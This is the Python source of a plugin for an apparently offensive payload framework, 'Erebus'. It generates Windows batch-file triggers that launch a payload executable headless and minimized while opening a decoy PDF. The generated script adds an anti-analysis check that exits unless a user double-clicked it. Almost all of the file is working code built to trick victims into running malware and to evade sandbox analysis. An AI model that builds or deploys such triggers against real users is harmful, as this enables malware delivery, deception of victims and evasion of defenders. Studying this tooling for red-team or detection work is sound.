"""
Erebus Plugin - BAT Trigger
Author: Whispergate
Description: Creates batch script (.bat) triggers for payload execution

This plugin creates BAT files that execute payloads while opening decoy documents.
The batch scripts include anti-analysis checks and stealth execution features.
"""

import pathlib
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class BatTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating Windows batch script (.bat) triggers.
    
    Batch files provide a simple way to execute payloads while displaying
    decoy files. This plugin creates BAT triggers with anti-analysis features
    and minimized execution windows.
    """

    def __init__(self):
        """Initialize the BAT trigger plugin"""
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"
        self.DECOY_FILE = self.AGENT_CODE / "decoys" / "decoy.pdf"

    def get_metadata(self) -> PluginMetadata:
        """Return plugin metadata"""
        return PluginMetadata(
            name="bat_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates batch script (.bat) triggers for payload execution",
            category=PluginCategory.TRIGGER,
            enabled=True
        )

    def register(self) -> Dict[str, Callable]:
        """Register the functions this plugin provides"""
        return {
            "create_bat_payload_trigger": self.create_bat_payload_trigger,
            "create_bat_trigger": self.create_bat_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        """Validate that required dependencies are available"""
        try:
            # Standard library only; ensure core paths resolve
            _ = self.PAYLOAD_DIR
            _ = self.DECOY_FILE
            return (True, None)
        except Exception as e:
            return (False, f"Validation error: {e}")

    def on_load(self):
        """Called when plugin is loaded"""
        print(f"[Plugin] BAT Trigger plugin loaded - Supporting batch script creation")

    # ==================== Plugin Functions ====================

    def create_bat_trigger(
        self,
        target_bin: str,
        args: str,
        decoy_file: str,
        payload_dir: Optional[pathlib.Path] = None,
        output_filename: Optional[str] = None
    ) -> pathlib.Path:
        """
        Create a BAT trigger file in the payloads directory.

        Args:
            target_bin: Binary to execute (e.g., "C:\\Windows\\System32\\conhost.exe")
            args: Command arguments (e.g., "--headless cmd.exe /Q /c erebus.exe | decoy.pdf")
            decoy_file: Name of the decoy file (e.g., "decoy.pdf")
            payload_dir: Directory where payload files are stored (uses default if None)
            output_filename: Output BAT filename (default: auto-generated from decoy_file)

        Returns:
            pathlib.Path: Path to the created BAT file

        Raises:
            RuntimeError: If BAT creation fails
        """
        try:
            if payload_dir is None:
                payload_dir = self.PAYLOAD_DIR

            # Auto-generate output filename based on decoy file if not provided
            if output_filename is None:
                output_filename = f"{decoy_file}.bat"

            bat_output_path = payload_dir / output_filename
            target_bin_win = str(target_bin).replace('/', '\\')
            decoy_file_win = str(decoy_file).replace('/', '\\')

            # Build BAT content with anti-analysis checks
            bat_content = []
            bat_content.append("@echo off")
            bat_content.append('echo %cmdcmdline% | find /i "%~f0" >nul || exit')
            bat_content.append(f'start "" /min "{target_bin_win}" {args} >nul 2>&1')
            bat_content.append(f'start "" "{decoy_file_win}"')
            bat_content.append("exit")

            # Write with Windows line endings
            with open(bat_output_path, 'w', newline='\r\n') as f:
                f.write('\n'.join(bat_content))

            return bat_output_path

        except Exception as e:
            raise RuntimeError(f"BAT trigger creation failed: {e}")

    def create_bat_payload_trigger(
        self,
        target_bin: str = "C:\\Windows\\System32\\conhost.exe",
        args: str = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
        payload_dir: Optional[pathlib.Path] = None,
        decoy_file: Optional[pathlib.Path] = None,
    ) -> pathlib.Path:
        """
        Create BAT payload trigger with builder.py parameter compatibility.

        Uses the same parameter names as builder.py:
        - target_bin: Maps to builder.py parameter "0.8 Trigger Binary"
        - args: Maps to builder.py parameter "0.9 Trigger Command"

        Args:
            target_bin: Binary to execute (default: "C:\\Windows\\System32\\conhost.exe")
            args: Command arguments (default: "--headless cmd.exe /Q /c erebus.exe | decoy.pdf")
            payload_dir: Directory where payload files are stored (uses default if None)
            decoy_file: Path to decoy file (uses default if None)

        Returns:
            pathlib.Path: Path to the created BAT file

        Raises:
            RuntimeError: If trigger creation fails
        """
        try:
            if decoy_file is None:
                decoy_file = self.DECOY_FILE

            decoy_filename = decoy_file.name

            return self.create_bat_trigger(
                target_bin=target_bin,
                args=args,
                decoy_file=decoy_filename,
                payload_dir=payload_dir
            )

        except Exception as e:
            raise RuntimeError(f"BAT payload trigger creation failed: {e}")


# Testing code
if __name__ == "__main__":
    _plugin = BatTriggerPlugin()
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()

    # Display all registered functions
    registered = _plugin.register()
    registered_names = sorted(registered.keys()) if registered else []
    print(f"[*] Registered functions ({len(registered_names)}):")
    for func_name in registered_names:
        print(f"    - {func_name}")
    print()

    is_valid, error = _plugin.validate()
    if is_valid:
        print("[+] Validation passed")
    else:
        print(f"[-] Validation failed: {error}")
